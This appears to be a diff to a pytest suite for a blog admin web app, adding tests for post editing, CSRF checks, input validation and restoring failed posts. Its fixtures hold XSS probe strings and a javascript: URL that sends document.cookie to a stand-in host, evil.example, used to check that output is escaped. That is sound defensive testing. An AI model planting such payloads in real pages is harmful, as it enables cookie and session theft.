@@ -7,6 +7,7 @@ import threading
 import pytest
 from werkzeug.security import generate_password_hash
 
+from src.application.use_cases.edit_post import EditPostUseCase
 from src.application.use_cases.list_posts import ListPostsUseCase
 from src.application.use_cases.publish_selected_post import (
     ManualPublishOutcome,
@@ -39,11 +40,14 @@ class Harness:
         published.published_url = "https://blog.tistory.com/4"
         hostile = _post(5, "악성 URL", PostStatus.PUBLISHED)
         hostile.published_url = "javascript:fetch('https://evil.example/'+document.cookie)"
-        repo = InMemoryPostRepository([
+        failed = _post(6, "실패 글", PostStatus.FAILED)
+        failed.error_message = "본문 붙여넣기 실패"
+        self.repo = repo = InMemoryPostRepository([
             _post(2, "OpenTelemetry 구축"),
             _post(3, "Istio <script>alert(1)</script>", body_len=10),
             published,
             hostile,
+            failed,
         ])
 
         def default_publish(row: int) -> ManualPublishResult:
@@ -59,6 +63,7 @@ class Harness:
             secret_key="test-secret-key-0123456789",
             throttle=LoginThrottle(max_attempts=3, window_seconds=600),
             allowed_hosts=allowed_hosts,
+            edit_post=EditPostUseCase(repo),
         )
         app.config["TESTING"] = True
         self.client = app.test_client()
@@ -299,3 +304,77 @@ def test_상세_화면에_본문이_이스케이프되어_보인다():
     html = client.get("/posts/2").get_data(as_text=True)
     assert re.search(r'<pre class="body">## 소제목\n\n본문 &lt;img', html)
     assert "<img src=x" not in html
+
+
+class TestEditPost:
+    def _edit(self, h, row=2, **fields):
+        data = {"title": "새 제목", "category": "TechNova", "tags": "a, b",
+                "body": "새 본문", "csrf_token": h.csrf(f"/posts/{row}")}
+        data.update(fields)
+        return h.client.post(f"/posts/{row}/edit", data=data)
+
+    def _row(self, h, row):
+        return next(p for p in h.repo.find_all() if p.row_index == row)
+
+    def test_발행대기_글에는_편집_폼이_있다(self, h):
+        h.login()
+        html = h.client.get("/posts/2").get_data(as_text=True)
+        assert 'action="/posts/2/edit"' in html
+        assert "<textarea" in html
+
+    def test_발행된_글에는_편집_폼이_없다(self, h):
+        h.login()
+        assert 'action="/posts/4/edit"' not in h.client.get("/posts/4").get_data(as_text=True)
+
+    def test_편집하면_저장하고_상세로_돌아간다(self, h):
+        h.login()
+        resp = self._edit(h)
+        assert resp.status_code == 302 and resp.headers["Location"] == "/posts/2"
+        post = self._row(h, 2)
+        assert (post.content.title, post.category, post.content.body_markdown) == (
+            "새 제목", "TechNova", "새 본문",
+        )
+        assert "저장했습니다" in h.client.get("/posts/2").get_data(as_text=True)
+
+    def test_CSRF_없는_편집은_거부(self, h):
+        h.login()
+        resp = h.client.post("/posts/2/edit", data={"title": "x", "body": "y"})
+        assert resp.status_code == 400
+        assert self._row(h, 2).content.title == "OpenTelemetry 구축 제목"
+
+    def test_제목이나_본문이_비면_저장하지_않는다(self, h):
+        h.login()
+        resp = self._edit(h, title="  ")
+        assert resp.status_code == 400
+        assert self._row(h, 2).content.title == "OpenTelemetry 구축 제목"
+
+    def test_너무_긴_값은_저장하지_않는다(self, h):
+        h.login()
+        assert self._edit(h, title="가" * 151).status_code == 400
+
+    def test_발행된_글은_편집_요청도_거부(self, h):
+        h.login()
+        resp = self._edit(h, row=4)
+        assert resp.status_code == 409
+        assert self._row(h, 4).content.title == "Kafka 입문 제목"
+
+    def test_편집한_제목도_이스케이프(self, h):
+        h.login()
+        self._edit(h, title="<img src=x onerror=alert(1)>")
+        html = h.client.get("/posts/2").get_data(as_text=True)
+        assert "<img src=x" not in html
+
+    def test_실패_글은_발행대기로_되돌린다(self, h):
+        h.login()
+        html = h.client.get("/posts/6").get_data(as_text=True)
+        assert 'action="/posts/6/restore"' in html
+        resp = h.client.post("/posts/6/restore", data={"csrf_token": h.csrf("/posts/6")})
+        assert resp.status_code == 302
+        post = self._row(h, 6)
+        assert post.status == PostStatus.PENDING and post.error_message == ""
+
+    def test_발행대기_글은_되돌리기_버튼이_없고_요청도_거부(self, h):
+        h.login()
+        assert 'action="/posts/2/restore"' not in h.client.get("/posts/2").get_data(as_text=True)
+        resp = h.client.post("/posts/2/restore", data={"csrf_token": h.csrf("/posts/2")})
+        assert resp.status_code == 409
